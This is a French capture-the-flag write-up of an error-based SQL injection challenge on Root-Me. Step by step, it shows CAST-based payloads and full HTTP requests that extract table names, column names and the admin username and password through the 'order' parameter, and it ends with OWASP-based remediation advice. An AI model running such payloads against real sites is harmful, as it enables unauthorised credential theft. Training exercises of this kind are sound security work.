## Challenge 7 – SQL Injection

- **Nom :** SQL Injection
- **URL :** https://www.root-me.org/fr/Challenges/Web-Serveur/SQL-injection-Error

### Étapes de découverte

1. Ouverture du challenge Root-Me.
2. Navigation sur le site, observation d'une page de login et d'une page de contenu (`contents`).
3. Identification du paramètre `order` dans l'URL de la page contents qui semble être utilisé dans une requête SQL :
   ```
   http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC
   ```
4. Test d'injection SQL en ajoutant une apostrophe (`'`) dans le paramètre `order` pour vérifier la vulnérabilité. Observation d'une erreur SQL, confirmant la présence d'une vulnérabilité d'**injection SQL**.
5. Exploitation de la vulnérabilité via **error-based SQL injection** en utilisant la fonction `CAST` pour extraire des informations via les messages d'erreur.
6. Extraction des noms de tables de la base de données avec la commande suivante, en modifiant `OFFSET` pour parcourir toutes les tables :
   ```sql
   , CAST((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0) AS INT)
   ```
7. Découverte de la table `m3mbr35t4bl3` qui contient probablement les identifiants des utilisateurs.
8. Extraction des noms de colonnes de la table `m3mbr35t4bl3` avec la commande suivante, en modifiant `OFFSET` pour parcourir toutes les colonnes :
   ```sql
   , CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'm3mbr35t4bl3' LIMIT 1 OFFSET 0) AS INT)
   ```
9. Identification des colonnes : `id`, `us3rn4m3_c0l`, `p455w0rd_c0l`.
10. Extraction du nom d'utilisateur admin avec la commande :
    ```sql
    , CAST((SELECT us3rn4m3_c0l FROM m3mbr35t4bl3 LIMIT 1 OFFSET 0) AS INT)
    ```
11. Extraction du mot de passe de l'admin avec la commande :
    ```sql
    , CAST((SELECT p455w0rd_c0l FROM m3mbr35t4bl3 LIMIT 1 OFFSET 0) AS INT)
    ```
12. Connexion avec les identifiants admin récupérés.
13. Récupération du flag dans la page admin.
14. Validation du challenge.

### Payloads utilisés

**Extraction des tables :**
```text
GET /web-serveur/ch34/?action=contents&order=ASC, CAST((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0) AS INT) HTTP/1.1
Host: challenge01.root-me.org
```

**Extraction des colonnes :**
```text
GET /web-serveur/ch34/?action=contents&order=ASC, CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'm3mbr35t4bl3' LIMIT 1 OFFSET 0) AS INT) HTTP/1.1
Host: challenge01.root-me.org
```

**Extraction du nom d'utilisateur admin :**
```text
GET /web-serveur/ch34/?action=contents&order=ASC, CAST((SELECT us3rn4m3_c0l FROM m3mbr35t4bl3 LIMIT 1 OFFSET 0) AS INT) HTTP/1.1
Host: challenge01.root-me.org
```

**Extraction du mot de passe admin :**
```text
GET /web-serveur/ch34/?action=contents&order=ASC, CAST((SELECT p455w0rd_c0l FROM m3mbr35t4bl3 LIMIT 1 OFFSET 0) AS INT) HTTP/1.1
Host: challenge01.root-me.org
```

### Les recommandations

Pour éviter ce type de vulnérabilité SQL injection, il est recommandé de :

1. **Utiliser des requêtes préparées (Prepared Statements)** : Utiliser des requêtes préparées avec des paramètres liés plutôt que de concaténer directement les entrées utilisateur dans les requêtes SQL. Cette méthode empêche l'injection SQL car les paramètres sont traités comme des données et non comme du code SQL.

   **Source :** [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

2. **Valider et assainir les entrées utilisateur** : Valider strictement les entrées utilisateur en utilisant une liste blanche de valeurs autorisées (whitelist) plutôt qu'une liste noire. Pour le paramètre `order`, utiliser une validation stricte qui n'accepte que des valeurs prédéfinies comme `ASC` ou `DESC`.

   **Source :** [OWASP SQL Injection Prevention Cheat Sheet - Input Validation](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#defense-option-1-prepared-statements-with-parameterized-queries)

3. **Utiliser le principe du moindre privilège** : Les comptes de base de données utilisés par l'application doivent avoir uniquement les permissions minimales nécessaires. Éviter d'utiliser un compte avec des privilèges administrateur pour les opérations courantes.

   **Source :** [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

4. **Masquer les messages d'erreur SQL** : Ne pas exposer les messages d'erreur SQL détaillés aux utilisateurs finaux. Les erreurs doivent être loggées côté serveur et des messages génériques doivent être affichés aux utilisateurs. Cela empêche les attaquants d'utiliser l'injection SQL basée sur les erreurs (error-based SQL injection).

   **Source :** [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

5. **Utiliser un WAF (Web Application Firewall)** : Implémenter un WAF pour détecter et bloquer les tentatives d'injection SQL. Cependant, cela ne doit pas être la seule ligne de défense et doit être combiné avec des requêtes préparées.

   **Source :** [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

Ces approches garantissent une protection robuste contre les attaques d'injection SQL, même lorsque les entrées utilisateur sont utilisées dans des clauses ORDER BY ou d'autres parties de la requête SQL.
